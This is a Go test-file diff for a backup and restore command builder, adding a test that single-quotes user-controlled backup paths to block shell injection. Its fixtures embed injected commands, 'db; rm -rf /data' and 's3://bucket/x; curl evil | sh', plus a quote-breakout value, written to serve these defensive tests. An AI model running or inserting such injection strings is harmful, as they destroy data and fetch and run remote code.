@@ -202,7 +202,7 @@ func TestGetBackupCommand(t *testing.T) {
 	v, _ := ParseVersion("5.26.0-enterprise")
 
 	cmd := GetBackupCommand(v, "mydb", "/backups/mydb", false, "")
-	if !containsStr(cmd, "--to-path=/backups/mydb") {
+	if !containsStr(cmd, "--to-path='/backups/mydb'") {
 		t.Errorf("expected --to-path flag in backup command: %q", cmd)
 	}
 	if !containsStr(cmd, "mydb") {
@@ -484,5 +484,22 @@ func TestGetRestoreCommand_QuotesDatabaseName(t *testing.T) {
 	evil := GetRestoreCommand(v, "db; rm -rf /data", "/backups/x")
 	if !containsStr(evil, `'db; rm -rf /data'`) {
 		t.Errorf("expected metacharacters contained within quotes, got: %q", evil)
+	}
+}
+
+// TestGetBackupCommand_ToPathShellInjectionGuard pins #219: the to-path is
+// assembled from user-controlled spec fields (storage.bucket, storage.path,
+// chainFromBackup) and the command runs via /bin/sh -c in a pod holding cloud
+// credentials — metacharacters must not escape into the shell.
+func TestGetBackupCommand_ToPathShellInjectionGuard(t *testing.T) {
+	v := &Version{Major: 5, Minor: 26}
+	cmd := GetBackupCommand(v, "mydb", `s3://bucket/x; curl evil | sh; /chain/`, false, "")
+	if !containsStr(cmd, `--to-path='s3://bucket/x; curl evil | sh; /chain/'`) {
+		t.Errorf("to-path must be single-quoted so metacharacters stay literal, got: %q", cmd)
+	}
+	// Embedded single quote can't break out of the quoting.
+	cmd = GetBackupCommand(v, "mydb", `/backup/a'b`, false, "")
+	if !containsStr(cmd, `--to-path='/backup/a'\''b'`) {
+		t.Errorf("embedded single quote must be escaped, got: %q", cmd)
 	}
 }
